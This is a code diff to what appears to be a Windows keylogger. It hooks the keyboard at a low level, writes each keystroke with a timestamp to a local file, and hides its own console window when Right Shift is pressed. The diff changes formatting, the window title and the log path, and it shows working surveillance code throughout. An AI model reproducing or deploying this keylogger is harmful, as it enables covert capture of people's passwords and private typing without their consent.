@@ -6,11 +6,13 @@
 #include <conio.h>
 #include <winuser.h>
 #include <ctime>
-#include <assert.h>
-std::FILE *fp = std::fopen("D:/lastInput.txt", "w");
+
+std::FILE *fp = std::fopen("lastInput.txt", "w");
+
 HHOOK keyboardHook = 0;
 
 time_t rawTime = 0;
+
 LRESULT CALLBACK LowLevelKeyboardProc(
     _In_ int nCode,
     _In_ WPARAM wParam,
@@ -28,9 +30,9 @@ LRESULT CALLBACK LowLevelKeyboardProc(
     */
     if (ks->flags & 0b10000000)
     {
-    	SetConsoleTitleA("keystrokes-master");
-	    HWND hWnd;
-	    hWnd=FindWindow(NULL,"keystrokes-master");
+        SetConsoleTitleA("Keystrokes");
+        HWND hWnd;
+        hWnd = FindWindow(NULL, "Keystrokes");
         time(&rawTime);
         struct tm *pTmInfo = localtime(&rawTime);
         if (0x30 <= ks->vkCode && ks->vkCode <= 0x5A)
@@ -44,23 +46,23 @@ LRESULT CALLBACK LowLevelKeyboardProc(
         }
         else if (ks->vkCode == VK_LSHIFT)
         {
-            fprintf(fp, "[%04d-%02d-%02d %02d:%02d:%02d] Keys Left SHIFT pressed\n", pTmInfo->tm_year + 1900, pTmInfo->tm_mon + 1, pTmInfo->tm_mday, pTmInfo->tm_hour, pTmInfo->tm_min, pTmInfo->tm_sec);
+            fprintf(fp, "[%04d-%02d-%02d %02d:%02d:%02d] Keys Left Shift pressed\n", pTmInfo->tm_year + 1900, pTmInfo->tm_mon + 1, pTmInfo->tm_mday, pTmInfo->tm_hour, pTmInfo->tm_min, pTmInfo->tm_sec);
         }
         else if (ks->vkCode == VK_RSHIFT)
         {
-            ShowWindow(hWnd,SW_HIDE);
+            ShowWindow(hWnd, SW_HIDE);
         }
         else if (ks->vkCode == VK_CAPITAL)
         {
-            fprintf(fp, "[%04d-%02d-%02d %02d:%02d:%02d] Keys CAPITAL pressed\n", pTmInfo->tm_year + 1900, pTmInfo->tm_mon + 1, pTmInfo->tm_mday, pTmInfo->tm_hour, pTmInfo->tm_min, pTmInfo->tm_sec);
+            fprintf(fp, "[%04d-%02d-%02d %02d:%02d:%02d] Keys Caps Lock pressed\n", pTmInfo->tm_year + 1900, pTmInfo->tm_mon + 1, pTmInfo->tm_mday, pTmInfo->tm_hour, pTmInfo->tm_min, pTmInfo->tm_sec);
         }
         else if (ks->vkCode == VK_LEFT)
         {
-            fprintf(fp, "[%04d-%02d-%02d %02d:%02d:%02d] Keys LEFT ARROW pressed\n", pTmInfo->tm_year + 1900, pTmInfo->tm_mon + 1, pTmInfo->tm_mday, pTmInfo->tm_hour, pTmInfo->tm_min, pTmInfo->tm_sec);
+            fprintf(fp, "[%04d-%02d-%02d %02d:%02d:%02d] Keys Left Arrow pressed\n", pTmInfo->tm_year + 1900, pTmInfo->tm_mon + 1, pTmInfo->tm_mday, pTmInfo->tm_hour, pTmInfo->tm_min, pTmInfo->tm_sec);
         }
         else if (ks->vkCode == VK_RIGHT)
         {
-            fprintf(fp, "[%04d-%02d-%02d %02d:%02d:%02d] Keys RIGHT ARROW pressed\n", pTmInfo->tm_year + 1900, pTmInfo->tm_mon + 1, pTmInfo->tm_mday, pTmInfo->tm_hour, pTmInfo->tm_min, pTmInfo->tm_sec);
+            fprintf(fp, "[%04d-%02d-%02d %02d:%02d:%02d] Keys Right Arrow pressed\n", pTmInfo->tm_year + 1900, pTmInfo->tm_mon + 1, pTmInfo->tm_mday, pTmInfo->tm_hour, pTmInfo->tm_min, pTmInfo->tm_sec);
         }
     }
 
@@ -69,7 +71,6 @@ LRESULT CALLBACK LowLevelKeyboardProc(
 
 int _tmain(int argc, _TCHAR *argv[])
 {
-    
     SetConsoleOutputCP(65001);
     // 安装钩子
     keyboardHook = SetWindowsHookEx(
@@ -97,7 +98,6 @@ int _tmain(int argc, _TCHAR *argv[])
 
     std::fclose(fp);
     return 0;
-    
 }
 #elif defined(__linux__)
 #endif
